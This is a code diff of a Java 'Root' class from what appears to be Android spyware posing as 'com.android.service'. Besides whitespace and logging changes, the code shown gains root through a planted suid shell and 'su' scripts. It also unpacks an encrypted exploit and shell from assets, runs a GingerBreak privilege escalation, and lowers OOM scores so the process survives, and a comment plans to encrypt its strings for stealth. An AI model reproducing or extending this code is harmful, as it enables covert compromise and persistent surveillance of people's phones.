@@ -48,46 +48,48 @@ public class Root {
 
 		return false;
 	}
-	
-	static public void adjustOom() {	
+
+	static public void adjustOom() {
 		if (Status.haveRoot() == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (adjustOom): cannot adjust OOM without root privileges"); //$NON-NLS-1$
 			}
-			
+
 			return;
 		}
 		
 		int pid = android.os.Process.myPid();
-		// 32_35=#!/system/bin/sh\n/system/bin/ntpsvd qzx \"echo '-1000' > /proc/
-		// 32_36=/oom_score_adj\"\n
-		String script = Messages.getString("32_35") + pid + Messages.getString("32_36");
-		//32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
-		//32_38=/oom_adj\"\n
-		script += Messages.getString("32_37") + pid + Messages.getString("32_38");
+		// 32_34=#!/system/bin/sh
+		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
+		// /proc/
+		// 32_36=/oom_score_adj\"
+		String script = Messages.getString("32_34")+ "\n" + Messages.getString("32_35") + pid + Messages.getString("32_36") + "\n";
+		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
+		// 32_38=/oom_adj\"
+		script += Messages.getString("32_37") + pid + Messages.getString("32_38") + "\n";
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (adjustOom): script: " + script); //$NON-NLS-1$
 		}
-				
+
 		if (createScript("o", script) == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (adjustOom): failed to create OOM script"); //$NON-NLS-1$
 			}
-			
+
 			return;
 		}
-		
+
 		Execute ex = new Execute();
 		ex.execute(Status.getAppContext().getFilesDir() + "/o");
-		
+
 		removeScript("o");
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (adjustOom): OOM Adjusted"); //$NON-NLS-1$
 		}
 	}
-	
+
 	// Prendi la root tramite superuser.apk
 	static public void superapkRoot() {
 		final File filesPath = Status.getAppContext().getFilesDir();
@@ -111,25 +113,37 @@ public class Root {
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
-				Check.log(TAG
-						+ " (superapkRoot): " + Messages.getString("32_31")); //$NON-NLS-1$
+				Check.log(TAG + " (superapkRoot): " + Messages.getString("32_31")); //$NON-NLS-1$
 			}
 
 			Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/" + suidext);
 
 			// 32.29 = /data/data/com.android.service/files/statusdb rt
 			// 32_34=#!/system/bin/sh\n
-			String script = Messages.getString("32.34") + Messages.getString("32_29") + "\n";
+			String script = Messages.getString("32_34") + "\n" + Messages.getString("32_29") + "\n";
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (superapkRoot), script: " + script);
+			}
 
 			if (Root.createScript("s", script) == true) {
 				Process runScript = Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/s");
-				runScript.waitFor();
+				int ret = runScript.waitFor();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (superapkRoot) execute 1: " + Messages.getString("32_7") + path + "/s" + " ret: "
+							+ ret);
+				}
 
 				// su -c /data/data/com.android.service/files/s
 				Process localProcess = Runtime.getRuntime().exec(Messages.getString("32_31"));
-				localProcess.waitFor();
-
-				Root.removeScript("s");
+				ret = localProcess.waitFor();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (superapkRoot) execute 2: " + Messages.getString("32_31") + " ret: " + ret);
+				}
+				//Root.removeScript("s");
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
+				}
 			}
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
@@ -144,34 +158,35 @@ public class Root {
 			return;
 		}
 	}
-	
-	// name WITHOUT path (script is generated inside /data/data/<package>/files/ directory)
+
+	// name WITHOUT path (script is generated inside /data/data/<package>/files/
+	// directory)
 	static public boolean createScript(String name, String script) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (createScript): script: " + script); //$NON-NLS-1$
 		}
-	
+
 		try {
 			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_PRIVATE);
 			fos.write(script.getBytes());
 			fos.close();
-	
-			Execute ex = new Execute();			
+
+			Execute ex = new Execute();
 			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + name);
-			
+
 			return true;
 		} catch (Exception e) {
 			if (Cfg.EXP) {
 				Check.log(e);
 			}
-	
+
 			return false;
 		}
 	}
 
 	static public void removeScript(String name) {
 		File rem = new File(Status.getAppContext().getFilesDir() + name);
-	
+
 		if (rem.exists()) {
 			rem.delete();
 		}
@@ -180,27 +195,39 @@ public class Root {
 	public void getPermissions() {
 		// Abbiamo su?
 		Status.setSu(PackageInfo.hasSu());
-	
+
 		// Abbiamo la root?
 		Status.setRoot(PackageInfo.checkRoot());
-	
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getPermissions), su: " + Status.haveSu() + " root: " + Status.haveRoot() + " want: "
+					+ Keys.self().wantsPrivilege());
+		}
+
 		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getPermissions), ask the user");
+			}
 			// Ask the user...
 			Root.superapkRoot();
-	
+
 			Status.setRoot(PackageInfo.checkRoot());
-	
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
 			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getPermissions), don't ask");
+			}
 		}
-	
+
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
 	}
 
 	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
-	FileNotFoundException {
+			FileNotFoundException {
 		try {
 			InputStream in = decodeEnc(stream, passphrase);
 
@@ -228,9 +255,9 @@ public class Root {
 
 		return true;
 	}
-	
-	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException, NoSuchAlgorithmException,
-	NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
+
+	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
+			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
 
 		SecretKey key = MessagesDecrypt.produceKey(passphrase);
 
@@ -277,11 +304,11 @@ public class Root {
 			// Creiamo il crashlog
 			final FileOutputStream fos = Status.getAppContext().openFileOutput(crashlog, Context.MODE_PRIVATE);
 			fos.close();
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (root): saving statuslog"); //$NON-NLS-1$
 			}
-			
+
 			// exploit
 			InputStream stream = Utils.getAssetStream("e.bin");
 
@@ -291,7 +318,7 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (root): saving exploit e.bin"); //$NON-NLS-1$
 			}
-			
+
 			// shell
 			stream = Utils.getAssetStream("s.bin");
 
@@ -369,7 +396,7 @@ public class Root {
 	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
 	// le stringe nella librunner.so. Fixare il fatto che l'app va
 	// in crash se la funzione torna 0 o 1 e si ferma il servizio
-	
+
 	/*
 	 * Verifica e prova ad ottenere le necessarie capabilities
 	 * 
@@ -393,7 +420,7 @@ public class Root {
 
 		try {
 			Execute ex = new Execute();
-			
+
 			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
 			// Creiamo la directory files
 			Status.getAppContext().openFileOutput("test", Context.MODE_WORLD_READABLE);
@@ -507,10 +534,10 @@ public class Root {
 
 		return 1;
 	}
-	
+
 	public void runGingerBreak() {
 		boolean isRoot = Status.haveRoot();
-	
+
 		if (isRoot == false) {
 			// Don't exploit if we have no SD card mounted
 			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
@@ -521,30 +548,30 @@ public class Root {
 				}
 			}
 		}
-	
+
 		if (isRoot == false) {
 			// Ask the user...
 			Root.superapkRoot();
-	
+
 			isRoot = PackageInfo.checkRoot();
 		}
-	
+
 		if (isRoot == true) {
 			int ret = Root.overridePermissions();
-	
+
 			Toast.makeText(Status.getAppContext(), "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-	
+
 			switch (ret) {
-				case 0:
-				case 1:
-					return; // Non possiamo partire
-	
-				case 2: // Possiamo partire
-				default:
-					break;
+			case 0:
+			case 1:
+				return; // Non possiamo partire
+
+			case 2: // Possiamo partire
+			default:
+				break;
 			}
 		}
-	
+
 		Status.setRoot(isRoot);
 	}
 
